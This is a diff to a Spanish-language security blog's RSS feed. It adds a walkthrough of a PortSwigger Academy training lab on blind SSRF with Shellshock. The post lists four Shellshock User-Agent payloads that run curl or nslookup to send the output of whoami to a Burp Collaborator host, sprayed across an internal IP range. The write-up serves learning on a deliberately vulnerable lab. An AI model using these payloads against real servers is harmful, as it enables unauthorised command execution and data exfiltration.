@@ -6,7 +6,146 @@
         <description>Recent content on A1ux</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>es-GT</language>
-        <lastBuildDate>Fri, 21 Jan 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://www.alux.cc/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 22 Jan 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://www.alux.cc/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Portswigger Academy Learning Path: Server-side request forgery (SSRF) Lab 7</title>
+        <link>https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-7/</link>
+        <pubDate>Sat, 22 Jan 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-7/</guid>
+        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-7/head.png" alt="Featured image of post Portswigger Academy Learning Path: Server-side request forgery (SSRF) Lab 7" /&gt;&lt;h1 id=&#34;lab-blind-ssrf-with-shellshock-exploitation&#34;&gt;Lab: Blind SSRF with Shellshock exploitation&lt;/h1&gt;
+&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder realizar ataques de ssrf que esta vulnerabildad trata de realizar solicitudes hacia otros dominios o ip arbitrarias a la cual el host puede tener acceso como puede ser una red interna a la que no se podria tener acceso desde afuera pero esta vez no es tan interna.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-7/banner.svg&#34; &gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-7/banner.svg&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			alt=&#34;Vulnerabilidad SSRF&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Vulnerabilidad SSRF&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Viendo la web y la informacion que nos da el lab es que el sistema envia la url al terminar de cargar toda la pagina y esto a traves del &lt;code&gt;Referer Header&lt;/code&gt;. Y tambien se nos da e entender que uno de los sistemas es vulnerable a &lt;code&gt;Shellshock&lt;/code&gt; por lo que debemos explotarlo para enviar el usuario de ese sistema dentro de la red y sustraer su usuario.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 299; 
+			flex-basis: 717px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-7/request1.png&#34; data-size=&#34;1528x511&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-7/request1.png&#34;
+			width=&#34;1528&#34;
+			height=&#34;511&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-7/request1_hua420f018fd4471d402a94fd2bb2f209b_100108_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-7/request1_hua420f018fd4471d402a94fd2bb2f209b_100108_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Peticion para cargar producto&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Peticion para cargar producto&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
+&lt;p&gt;Sabiendo esto preparamos nuestra peticion enviando cualquiera de las siguientes inyecciones en el &lt;code&gt;User-Agent&lt;/code&gt; para explotar Shellchock que lo que hara es enumerar ya sea el nombre de dns con el nombre del usuario del sistema o hacer una peticion para la solicitud de la web pero claramente inyectando el nombre de usuario.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;User-Agent: () { :; }; /usr/bin/curl $(whoami).qb5jf0ce8ttcnwvxrfeco4y0zr5kt9.burpcollaborator.net
+User-Agent: () { :; }; /usr/bin/nslookup $(whoami).qb5jf0ce8ttcnwvxrfeco4y0zr5kt9.burpcollaborator.net
+User-Agent: () { :; }; /usr/bin/curl `whoami`.qb5jf0ce8ttcnwvxrfeco4y0zr5kt9.burpcollaborator.net
+User-Agent: () { :; }; /usr/bin/nslookup `whoami`.qb5jf0ce8ttcnwvxrfeco4y0zr5kt9.burpcollaborator.net
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Y todo esto lo hacemos en el rango de ips &lt;code&gt;192.168.0.1-255&lt;/code&gt; hacia la pagina de inicio&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 210; 
+			flex-basis: 504px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-7/positions.png&#34; data-size=&#34;900x428&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-7/positions.png&#34;
+			width=&#34;900&#34;
+			height=&#34;428&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-7/positions_hue646b8d27c7bcaf1b5bd92266fe1c173_54230_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-7/positions_hue646b8d27c7bcaf1b5bd92266fe1c173_54230_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Posiciones para el envio de peticiones&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Posiciones para el envio de peticiones&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 161; 
+			flex-basis: 387px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-7/payloads.png&#34; data-size=&#34;652x404&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-7/payloads.png&#34;
+			width=&#34;652&#34;
+			height=&#34;404&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-7/payloads_hu0d9f89a90befeb210e214299096ca5b4_15009_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-7/payloads_hu0d9f89a90befeb210e214299096ca5b4_15009_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Payload a enviar para las solicitudes&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Payload a enviar para las solicitudes&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Y hemos recibido una peticion en Burp Collaborator con el nombre de usuario del sistema que es vulnerable a shellshock.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 246; 
+			flex-basis: 592px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-7/collaborator.png&#34; data-size=&#34;1115x452&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-7/collaborator.png&#34;
+			width=&#34;1115&#34;
+			height=&#34;452&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-7/collaborator_hua2e85350eac31949793aebb23a856119_23440_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-7/collaborator_hua2e85350eac31949793aebb23a856119_23440_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Collaborator log&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Collaborator log&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Y ahora ya hemos resuelto el lab automaticamente.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 262; 
+			flex-basis: 628px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-7/resuelto.png&#34; data-size=&#34;1808x690&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-7/resuelto.png&#34;
+			width=&#34;1808&#34;
+			height=&#34;690&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-7/resuelto_huf4af62941dcc6237fb1bde37ecc2b55d_314974_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-7/resuelto_huf4af62941dcc6237fb1bde37ecc2b55d_314974_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Laboratorio resuelto&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;
+</description>
+        </item>
+        <item>
         <title>Portswigger Academy Learning Path: Server-side request forgery (SSRF) Lab 6</title>
         <link>https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-6/</link>
         <pubDate>Fri, 21 Jan 2022 00:00:00 +0000</pubDate>
